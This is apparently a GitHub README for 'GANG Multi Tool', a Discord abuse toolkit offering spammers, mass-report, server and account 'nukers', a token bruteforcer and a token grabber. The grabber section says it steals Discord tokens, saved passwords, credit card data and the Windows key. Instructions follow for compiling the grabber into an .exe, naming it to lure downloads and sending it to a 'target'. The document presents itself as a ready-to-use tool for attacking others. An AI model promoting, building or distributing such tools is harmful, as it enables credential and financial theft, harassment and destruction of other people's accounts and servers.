## GANG Multi Tool Menu: 

# [YOUTUBE TUTORIAL!](https://www.youtube.com/watch?v=BGhO_nMjpRg&t=1s)
![image](https://user-images.githubusercontent.com/94531396/144039345-9891c796-59a3-47d3-9915-00b2266076f7.png)


### Features:
5
- `Most Advanced Multi Tool!`
- `Spammer`
- `DM Spammer`
- `Friend Spammer`
- `Reaction Spam`
- `WebhookSpammer`
- `Typing Spammer`
- `VC Spammer`
- `Mass DM`
- `About / Activity`
- `Joiner`
- `Leaver`
- `TokenChecker`
- `Token Onliner`
- `HypeSquad Joiner`
- `NickName Changer`
- `Status Changer` 
- `Mass Report`
- `Server Nuker`
- `Account Nuker`
- `Token Bruteforcer`
- `Token Grabber`
- `Group Spammer`
- `About`
- `Exit`

## ❗  - Important:
- Make sure to have [Python](https://www.python.org/downloads/) 3.10.0 before Downloading! 

![image](https://user-images.githubusercontent.com/94531396/144041711-9ae57771-8073-4be2-b711-83f04a0c90cc.png)

- Also make sure to have python added to [PATH](https://datatofish.com/add-python-to-windows-path/)

![image](https://user-images.githubusercontent.com/94531396/144043762-62686438-ddf5-40fb-a0a2-d2834daaa660.png)

## ❗  - Installation:
#### 1st・Installation (Source Code)
```
git clone https://github.com/TT-Tutorials/GANG-Nuker
pip install pyinstaller
start.bat
```

#### 2nd・Installation (.exe file)
```
https://github.com/TT-Tutorials/GANG-Nuker/releases
Download the latest release (GANG-Nuker.zip)
Drag it out to desktop and extract it
Open GANG.exe
```

### [21] Token Grabber
- Token
- Username
- Their discord token from all their accounts they have
- All login passwords in the .zip file!
- All of their credit card info (.zip file)
- Windows key in (.zip file)

![image](https://user-images.githubusercontent.com/94531396/144045656-b8483f78-2078-4195-9cc9-4afdfcad72e9.png)


### How to make the token grabber into an .exe
```
Create the Token Grabber in GANG Multi Tool first
Rename the Token Grabber file to what ever you want it to say (something so people download it!)
Tap "Edit" on the "Build .exe.bat"
Select "Edit with Notepad"
Delete "(FILE NAME!)" and change it to what you named your token grabber file
Once doing that tap: Ctrl + S to save
Run the Build .exe.bat
The .exe will be created in "dist" (Send that to your target)
```
![image](https://user-images.githubusercontent.com/94531396/144050019-7739c93f-cebb-4e45-bdea-574362c8b3d7.png)
![image](https://user-images.githubusercontent.com/94531396/144050106-b6a53ff9-38db-4925-a302-c16fe442fd6a.png)


- Make sure to join my [discord](https://discord.gg/raided) and fill free to dm me @††#7777. Thanks for using GANG Multi Tool!
- Coded / Developed by ††#7777
